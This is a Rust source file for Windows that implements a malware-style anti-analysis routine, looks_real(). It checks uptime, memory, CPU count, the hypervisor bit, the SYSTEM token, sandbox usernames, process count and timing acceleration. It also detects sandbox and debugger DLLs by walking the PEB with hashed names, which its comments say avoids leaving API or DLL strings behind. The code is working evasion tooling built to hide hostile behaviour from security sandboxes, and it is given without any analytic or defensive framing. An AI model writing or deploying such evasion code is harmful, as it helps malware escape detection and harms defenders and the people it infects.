#[cfg(target_os = "windows")]
use windows_sys::Win32::System::SystemInformation::{
    GetTickCount64, GlobalMemoryStatusEx, MEMORYSTATUSEX, GetSystemInfo, SYSTEM_INFO,
};

#[cfg(target_os = "windows")]
unsafe fn username_is_sandbox() -> bool {
    use windows_sys::Win32::System::WindowsProgramming::GetUserNameA;
    let mut buf = [0u8; 64];
    let mut len = 64u32;
    if GetUserNameA(buf.as_mut_ptr(), &mut len) == 0 { return false; }
    let lower: Vec<u8> = buf[..len.saturating_sub(1) as usize]
        .iter().map(|&b| b.to_ascii_lowercase()).collect();
    const BAD: &[&[u8]] = &[b"sandbox", b"maltest", b"virus", b"cuckoo", b"john", b"test"];
    BAD.iter().any(|&n| lower == n)
}

#[cfg(target_os = "windows")]
unsafe fn process_count_low() -> bool {
    use windows_sys::Win32::{
        Foundation::CloseHandle,
        System::Diagnostics::ToolHelp::{
            CreateToolhelp32Snapshot, Process32FirstW, Process32NextW,
            PROCESSENTRY32W, TH32CS_SNAPPROCESS,
        },
    };
    let snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if snap == -1isize { return false; }
    let mut entry: PROCESSENTRY32W = core::mem::zeroed();
    entry.dwSize = core::mem::size_of::<PROCESSENTRY32W>() as u32;
    let mut count = 0usize;
    if Process32FirstW(snap, &mut entry) != 0 {
        count += 1;
        while Process32NextW(snap, &mut entry) != 0 { count += 1; }
    }
    CloseHandle(snap);
    count < 50
}

#[cfg(all(target_arch = "x86_64", target_os = "windows"))]
unsafe fn hypervisor_bit_set() -> bool {
    let ecx: u32;
    core::arch::asm!(
        "cpuid",
        inout("eax") 1u32 => _,
        out("ebx") _,
        out("ecx") ecx,
        out("edx") _,
        options(nostack, preserves_flags),
    );
    (ecx >> 31) & 1 != 0
}

#[cfg(target_os = "windows")]
unsafe fn running_as_system() -> bool {
    use windows_sys::Win32::{
        Foundation::CloseHandle,
        Security::{
            GetTokenInformation, OpenProcessToken, TOKEN_QUERY, TOKEN_USER,
            TokenUser,
        },
        System::Threading::GetCurrentProcess,
    };

    let mut token_handle: windows_sys::Win32::Foundation::HANDLE = 0;
    if OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &mut token_handle) == 0 {
        return false;
    }

    let mut buf = vec![0u8; 256];
    let mut return_len = 0u32;
    let ok = GetTokenInformation(
        token_handle,
        TokenUser,
        buf.as_mut_ptr() as _,
        buf.len() as u32,
        &mut return_len,
    );
    CloseHandle(token_handle);
    if ok == 0 { return false; }

    // TOKEN_USER.User.Sid points to a SID. S-1-5-18 (LocalSystem) has:
    // Revision=1, SubAuthorityCount=1, IdentifierAuthority={0,0,0,0,0,5}, SubAuthority[0]=18
    let sid_ptr = *(buf.as_ptr() as *const *const u8);
    if sid_ptr.is_null() { return false; }
    let revision      = *sid_ptr;
    let sub_auth_cnt  = *sid_ptr.add(1);
    let auth_6        = *sid_ptr.add(7); // IdentifierAuthority[5] = 5
    let sub_auth_0    = u32::from_le_bytes([
        *sid_ptr.add(8), *sid_ptr.add(9), *sid_ptr.add(10), *sid_ptr.add(11),
    ]);
    revision == 1 && sub_auth_cnt == 1 && auth_6 == 5 && sub_auth_0 == 18
}

/// Returns true if any known sandbox/analysis DLL is loaded into the current process.
/// Uses PEB walk (no GetModuleHandleA) to check without leaving API call strings in IAT.
#[cfg(all(target_os = "windows", target_arch = "x86_64"))]
unsafe fn analysis_dll_present() -> bool {
    use crate::resolve::api_hash::{djb2_hash_lower, peb_get_module_base};
    // Compile-time hashes; no plaintext DLL names at runtime.
    const HASHES: &[u32] = &[
        djb2_hash_lower(b"sbiedll.dll"),    // Sandboxie
        djb2_hash_lower(b"cmdvrt32.dll"),   // Comodo sandbox
        djb2_hash_lower(b"api_log.dll"),    // CWSandbox
        djb2_hash_lower(b"dir_watch.dll"),  // CWSandbox
        djb2_hash_lower(b"pstorec.dll"),    // Cuckoo stub
        djb2_hash_lower(b"wpespy.dll"),     // WPE Pro packet logger
        djb2_hash_lower(b"vmcheck.dll"),    // VMware check lib
        djb2_hash_lower(b"dbghlp.dll"),     // Debugger helper variant
    ];
    for &h in HASHES {
        if !peb_get_module_base(h).is_null() { return true; }
    }
    false
}

#[cfg(all(target_os = "windows", not(target_arch = "x86_64")))]
unsafe fn analysis_dll_present() -> bool {
    use windows_sys::Win32::System::LibraryLoader::GetModuleHandleA;
    const DLLS: &[&[u8]] = &[
        b"SbieDll.dll\0", b"cmdvrt32.dll\0", b"api_log.dll\0", b"dir_watch.dll\0",
        b"pstorec.dll\0",  b"wpespy.dll\0",   b"vmcheck.dll\0", b"dbghlp.dll\0",
    ];
    DLLS.iter().any(|&dll| GetModuleHandleA(dll.as_ptr()) != 0)
}

#[cfg(all(target_arch = "x86_64", target_os = "windows"))]
unsafe fn rdtsc() -> u64 {
    let lo: u32;
    let hi: u32;
    core::arch::asm!("rdtsc", out("eax") lo, out("edx") hi, options(nostack, preserves_flags, nomem));
    ((hi as u64) << 32) | lo as u64
}

#[cfg(all(target_arch = "x86_64", target_os = "windows"))]
unsafe fn time_accelerated() -> bool {
    let t0 = GetTickCount64();
    let tsc0 = rdtsc();
    let mut sink: u64 = 1;
    for i in 0u64..20_000_000u64 { sink = sink.wrapping_add(i); }
    core::hint::black_box(sink);
    let t1 = GetTickCount64();
    let tsc1 = rdtsc();

    let wall_ms = t1.saturating_sub(t0);
    let tsc_delta = tsc1.saturating_sub(tsc0);

    // Impossible: wall says >5ms passed but TSC says <500k cycles (would need >10 MHz clock to run 20M iters that fast)
    if wall_ms > 5 && tsc_delta < 500_000 { return true; }
    // Impossible: claimed effective clock > 100 GHz
    if wall_ms > 0 && (tsc_delta / wall_ms) > 100_000_000 { return true; }
    false
}

#[cfg(target_os = "windows")]
pub unsafe fn looks_real() -> bool {
    // Uptime check: at least 30 minutes
    let uptime_ms = GetTickCount64();
    if uptime_ms < 30 * 60 * 1000 { return false; }

    // RAM check: at least 2 GB
    let mut mem_status: MEMORYSTATUSEX = core::mem::zeroed();
    mem_status.dwLength = core::mem::size_of::<MEMORYSTATUSEX>() as u32;
    GlobalMemoryStatusEx(&mut mem_status);
    if mem_status.ullTotalPhys < 2u64 * 1024 * 1024 * 1024 { return false; }

    // CPU count check: at least 2 processors (sandboxes often have 1)
    let mut sysinfo: SYSTEM_INFO = core::mem::zeroed();
    GetSystemInfo(&mut sysinfo);
    if sysinfo.dwNumberOfProcessors < 2 { return false; }

    #[cfg(all(target_arch = "x86_64", target_os = "windows"))]
    if hypervisor_bit_set() { return false; }

    #[cfg(target_os = "windows")]
    if running_as_system() { return false; }

    #[cfg(target_os = "windows")]
    if analysis_dll_present() { return false; }

    #[cfg(all(target_arch = "x86_64", target_os = "windows"))]
    if time_accelerated() { return false; }

    #[cfg(target_os = "windows")]
    if username_is_sandbox() { return false; }

    #[cfg(target_os = "windows")]
    if process_count_low() { return false; }

    true
}
